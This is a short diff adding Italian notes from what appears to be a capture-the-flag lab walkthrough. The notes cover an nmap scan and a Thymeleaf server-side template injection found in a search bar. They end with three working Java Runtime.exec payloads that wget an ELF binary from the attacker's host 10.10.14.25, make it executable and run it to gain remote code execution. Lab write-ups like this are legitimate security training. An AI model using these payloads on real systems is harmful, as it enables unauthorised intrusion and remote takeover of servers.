@@ -1,0 +1,19 @@
+IP: 10.10.11.170
+--------
+nmap scan 
+
+sudo nmap -sC -sV -oN scan.txt 10.10.11.170
+
+trovo aperta la porta dell'ssh e di un server web sulla porta 8080
+--------
+nel sito vedo una barra di ricerca che potrebbe essere vulnerabile ad una possibile injection
+dato che non vedo dalla scansione alcun tipo di servizio sql posso escludere una sql injection ed effetuare una Server-side template injection (SSTI), questo potrebbe portarmi ad ottenere una remote code execution (RCE)
+--------
+https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
+provo con #{7*7} e vedo che l'injection funziona
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.25/r.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
